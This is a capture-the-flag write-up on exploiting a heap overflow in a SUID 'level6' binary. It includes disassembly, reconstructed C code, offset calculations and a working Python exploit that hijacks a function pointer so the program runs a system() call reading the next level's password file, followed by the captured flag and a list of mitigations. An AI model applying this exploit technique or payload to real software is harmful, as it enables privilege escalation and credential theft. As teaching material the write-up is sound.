# Level6 Analysis - Heap Buffer Overflow and Function Pointer Overwrite

## Overview
Level6 demonstrates heap-based buffer overflow exploitation with function pointer hijacking. Unlike previous stack-based vulnerabilities, this attack manipulates heap memory to redirect program execution flow through careful memory corruption.

## Binary Information
- **File**: ELF 32-bit LSB executable, Intel 80386, dynamically linked
- **Permissions**: -rwsr-s---+ 1 level7 users (SUID bit set for level7)
- **Size**: 5274 bytes
- **BuildID**: b1a5ce594393de0f273c64753cede6da01744479
- **Key Functions**: malloc(), strcpy(), system(), puts(), main(), n(), m()

## Behavioral Analysis

### Initial Testing Results
- **No arguments**: `Segmentation fault (core dumped)` - accessing NULL/invalid memory
- **With arguments**: `"Nope"` output - indicates normal execution reaching function m()
- **Multiple arguments**: Still `"Nope"` - program only processes argv[1]
- **Vulnerability type**: Heap-based buffer overflow (distinct from stack overflows)

### Function Discovery
Through GDB analysis, identified three critical functions:
- **main()**: Program entry point with heap allocations and strcpy vulnerability
- **m()**: Default function that prints "Nope" (normal execution path)
- **n()**: Target function containing system() call (our goal)

## Assembly Analysis and Reverse Engineering

### Main Function Detailed Analysis:
```asm
0x0804847c <+0>:    push   %ebp
0x0804847d <+1>:    mov    %esp,%ebp
0x0804847f <+3>:    and    $0xfffffff0,%esp    # Stack alignment
0x08048482 <+6>:    sub    $0x20,%esp          # Local stack space (32 bytes)

# First heap allocation - buffer for strcpy
0x08048485 <+9>:    movl   $0x40,(%esp)        # malloc(64) - 0x40 = 64 bytes
0x0804848c <+16>:   call   0x8048350 <malloc@plt>
0x08048491 <+21>:   mov    %eax,0x1c(%esp)     # Store buffer1 pointer

# Second heap allocation - function pointer storage  
0x08048495 <+25>:   movl   $0x4,(%esp)         # malloc(4) - pointer size
0x0804849c <+32>:   call   0x8048350 <malloc@plt>
0x080484a1 <+37>:   mov    %eax,0x18(%esp)     # Store funcptr pointer

# Initialize function pointer to m()
0x080484a5 <+41>:   mov    $0x8048468,%edx     # Load address of function m
0x080484aa <+46>:   mov    0x18(%esp),%eax     # Get funcptr pointer
0x080484ae <+50>:   mov    %edx,(%eax)         # *funcptr = m

# Get user input from argv[1]
0x080484b0 <+52>:   mov    0xc(%ebp),%eax      # Get argv (argc+1 = argv)
0x080484b3 <+55>:   add    $0x4,%eax          # argv + 1 = argv[1]
0x080484b6 <+58>:   mov    (%eax),%eax        # Dereference to get argv[1] string

# VULNERABLE STRCPY CALL
0x080484b8 <+60>:   mov    %eax,%edx          # Source: argv[1]
0x080484ba <+62>:   mov    0x1c(%esp),%eax    # Destination: buffer1
0x080484be <+66>:   mov    %edx,0x4(%esp)     # strcpy source parameter
0x080484c2 <+70>:   mov    %eax,(%esp)        # strcpy destination parameter
0x080484c5 <+73>:   call   0x8048340 <strcpy@plt>  # strcpy(buffer1, argv[1])

# FUNCTION POINTER CALL
0x080484ca <+78>:   mov    0x18(%esp),%eax    # Get funcptr pointer
0x080484ce <+82>:   mov    (%eax),%eax        # Dereference: get function address
0x080484d0 <+84>:   call   *%eax             # Call the function pointer!
```

### Function m() - Default Execution Path:
```asm
0x08048468 <+0>:    push   %ebp
0x08048469 <+1>:    mov    %esp,%ebp
0x0804846b <+3>:    sub    $0x18,%esp          # Stack frame setup
0x0804846e <+6>:    movl   $0x80485d1,(%esp)   # Load "Nope" string address
0x08048475 <+13>:   call   0x8048360 <puts@plt>   # puts("Nope")
0x0804847a <+18>:   leave  
0x0804847b <+19>:   ret    
```
**Purpose**: Default function that prints "Nope" and returns

### Function n() - Target Function with system():
```asm
0x08048454 <+0>:    push   %ebp
0x08048455 <+1>:    mov    %esp,%ebp
0x08048457 <+3>:    sub    $0x18,%esp          # Stack frame setup
0x0804845a <+6>:    movl   $0x80485b0,(%esp)   # Load command string address
0x08048461 <+13>:   call   0x8048370 <system@plt> # system("/bin/cat /home/user/level7/.pass")
0x08048466 <+18>:   leave  
0x08048467 <+19>:   ret    
```
**Purpose**: Target function that executes system() to reveal flag

## Source Code Reconstruction
Based on assembly analysis, the equivalent C code is:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Target function - contains system() call to get flag
void n() {
    system("/bin/cat /home/user/level7/.pass");
}

// Default function - prints "Nope" message
void m() {
    puts("Nope");
}

int main(int argc, char **argv) {
    char *buffer1;          // First heap allocation: 64-byte buffer
    void (**funcptr)();     // Second heap allocation: function pointer storage
    
    // Heap allocations
    buffer1 = malloc(64);   // malloc(0x40) - strcpy destination
    funcptr = malloc(4);    // malloc(0x4) - function pointer storage
    
    // Initialize function pointer to default function
    *funcptr = m;           // Points to m() initially
    
    // VULNERABILITY: Unchecked strcpy from user input
    strcpy(buffer1, argv[1]); // No bounds checking!
    
    // Call whatever function the pointer points to
    (*funcptr)();           // This is what we want to hijack
    
    return 0;
}
```

## Vulnerability Analysis

### Heap Buffer Overflow Details
- **Location**: `strcpy(buffer1, argv[1])` with no bounds validation
- **Type**: Classical heap buffer overflow (CWE-122)
- **Impact**: Adjacent heap memory corruption leading to function pointer hijacking
- **Root Cause**: Missing input length validation in strcpy() usage

### Memory Layout Analysis

#### Heap Allocation Sequence
1. **buffer1 = malloc(64)**: First allocation, 64-byte buffer for strcpy destination
2. **funcptr = malloc(4)**: Second allocation, 4-byte storage for function pointer
3. **Heap layout**: Adjacent allocations with predictable layout

#### Detailed Heap Memory Layout
```
Heap Memory Structure:
┌─────────────────┬──────────────────┬─────────────────┐
│    buffer1      │  Heap Metadata   │    funcptr      │
│   (64 bytes)    │   (~8 bytes)     │   (4 bytes)     │
│ strcpy target   │ malloc headers   │ points to m()   │
└─────────────────┴──────────────────┴─────────────────┘
     ^                                        ^
     │                                        └─ Overwrite target
     └─ Overflow source

Total offset from buffer1 start to funcptr: ~72 bytes
```

### Exploitation Mechanics

#### Attack Vector Analysis
- **Entry Point**: User-controlled argv[1] parameter
- **Vulnerability**: strcpy() with no length bounds checking  
- **Target**: Function pointer stored in second heap allocation
- **Goal**: Overwrite funcptr to point to n() instead of m()

#### Memory Corruption Process
1. **Normal strcpy()**: Copies argv[1] into 64-byte buffer1
2. **Overflow condition**: Input longer than 64 bytes continues writing
3. **Metadata corruption**: Overwrites heap chunk metadata (8 bytes)
4. **Function pointer overwrite**: Corrupts funcptr with attacker-controlled value
5. **Execution hijack**: `(*funcptr)()` calls attacker-specified function

## Exploitation Strategy

### Address Analysis
- **Function m() address**: `0x08048468` (default execution path)
- **Function n() address**: `0x08048454` (target containing system() call)
- **Offset calculation**: 64 (buffer) + 8 (heap metadata) = 72 bytes total

### Payload Construction Strategy
```python
# Heap overflow payload structure:
# [64 bytes buffer overflow] + [8 bytes heap metadata] + [4 bytes function pointer]

offset = 72                                    # Bytes to reach function pointer
padding = "A" * offset                         # Fill buffer + metadata
target_address = struct.pack("<L", 0x08048454) # n() function address (little-endian)
payload = padding + target_address             # Complete exploit payload
```

### Execution Flow Hijacking
```
Normal Execution Flow:
main() → malloc() → malloc() → *funcptr = m → strcpy() → (*funcptr)() → m() → puts("Nope")

Exploited Execution Flow:  
main() → malloc() → malloc() → *funcptr = m → strcpy() → [overflow] → (*funcptr)() → n() → system()
                                                              │                      │         │
                                                              └─ overwrites funcptr  │         └─ flag!
                                                                     with n() addr ──┘
```

## Working Exploit Implementation

### Final exploit.py
```python
#!/usr/bin/env python2

import struct

# Level6 - Heap Buffer Overflow Exploit
# Overwrite function pointer to redirect execution from m() to n()

# Target function addresses from disassembly
n_function = 0x08048454      # Function n() - calls system() (our goal)
m_function = 0x08048468      # Function m() - prints "Nope" (default)

# Heap layout calculation:
# buffer1 = malloc(64)     <- strcpy destination  
# [heap metadata ~8 bytes] <- malloc chunk headers
# funcptr = malloc(4)      <- function pointer storage (overwrite target)
#
# Total offset = 64 (buffer) + 8 (metadata) = 72 bytes

offset = 72
padding = "A" * offset                           # Overflow padding
target_address = struct.pack("<L", n_function)   # Address of n() in little-endian

payload = padding + target_address

print payload
```

### Execution and Results
```bash
$ ./level6 $(python exploit.py)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

**Success indicators**:
- No "Nope" output (m() function bypassed)
- Flag displayed (n() function executed)
- system() call successfully executed with level7 privileges

## Advanced Technical Concepts

### Heap Memory Management
- **malloc() implementation**: Understanding glibc heap chunk structure
- **Heap metadata**: Chunk headers containing size and status information
- **Adjacent allocation**: Predictable layout for consecutive malloc() calls
- **Memory alignment**: 32-bit system alignment affecting chunk placement

### Function Pointer Exploitation
- **Indirect calls**: `call *%eax` instruction allows runtime target specification
- **Control flow hijacking**: Redirecting execution without code injection
- **Code reuse**: Leveraging existing functions (n) instead of shellcode injection
- **Precision targeting**: Exact offset calculation for reliable exploitation

### Heap vs Stack Exploitation
**Differences from stack-based attacks**:
- **Memory location**: Heap (dynamic) vs Stack (automatic) storage
- **Allocation timing**: Runtime malloc() vs compile-time stack frame
- **Metadata presence**: Heap chunks have management headers
- **Predictability**: Generally more predictable layout than stack

## Security Analysis

### Vulnerability Classification
- **CWE-122**: Heap-based Buffer Overflow
- **CVSS Impact**: High (arbitrary code execution via function pointer hijacking)
- **Attack Vector**: Local (command line argument processing)
- **Complexity**: Medium (requires heap layout understanding)

### Root Cause Analysis
1. **Missing input validation**: No length checking on strcpy() source
2. **Unsafe function usage**: strcpy() inherently dangerous without bounds
3. **Poor memory management**: Adjacent sensitive data (function pointer)
4. **Lack of modern protections**: No heap cookies, ASLR, or control flow integrity

### Defensive Measures

#### Code-Level Mitigations
1. **Safe string functions**: Use strncpy(), strlcpy(), or snprintf() with length limits
2. **Input validation**: Check argument length before copying
3. **Buffer isolation**: Separate critical data from user-controlled buffers
4. **Function pointer protection**: Use indirect call validation

#### System-Level Protections  
1. **ASLR**: Randomize heap addresses to make exploitation unpredictable
2. **Heap cookies**: Metadata integrity checking to detect corruption
3. **Control Flow Integrity (CFI)**: Validate indirect call targets
4. **Stack/heap separation**: Use separate memory regions with different permissions

#### Modern Compiler Protections
- **FORTIFY_SOURCE**: Enhanced runtime bounds checking for string functions
- **Stack protector**: Canary values (though not applicable to heap attacks)
- **Position Independent Executable (PIE)**: Code address randomization
- **Relocation Read-Only (RELRO)**: Protect dynamic linking structures

## Educational Outcomes

### Skills Demonstrated
1. **Heap Memory Analysis**: Understanding dynamic memory allocation and layout
2. **Binary Reverse Engineering**: Reconstructing program logic from assembly
3. **Vulnerability Assessment**: Identifying and analyzing heap overflow conditions  
4. **Exploit Development**: Creating precise memory corruption payloads
5. **Function Pointer Hijacking**: Advanced control flow redirection techniques

### Key Learning Points
- **Memory layout matters**: Understanding heap structure critical for exploitation
- **Precision required**: Exact offset calculation necessary for reliable attacks
- **Code reuse elegance**: Using existing functions more efficient than shellcode
- **Input validation critical**: Even simple string copying requires bounds checking
- **Adjacent data risks**: Sensitive data placement affects security posture

## Flag and Progression
**Level7 Password**: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

## Conclusion
Level6 demonstrates sophisticated heap exploitation techniques requiring deep understanding of:
- Dynamic memory management and heap chunk structure
- Function pointer hijacking for control flow redirection  
- Precise memory layout analysis and offset calculation
- Binary reverse engineering and vulnerability identification

This level showcases how seemingly simple programming errors (missing bounds checking) can lead to complete program control through careful memory corruption. The heap-based nature adds complexity compared to stack overflows, requiring understanding of malloc() internals and heap metadata structures.

The exploit elegantly demonstrates code reuse techniques, leveraging existing program functionality rather than injecting new code, representing a fundamental approach in modern binary exploitation.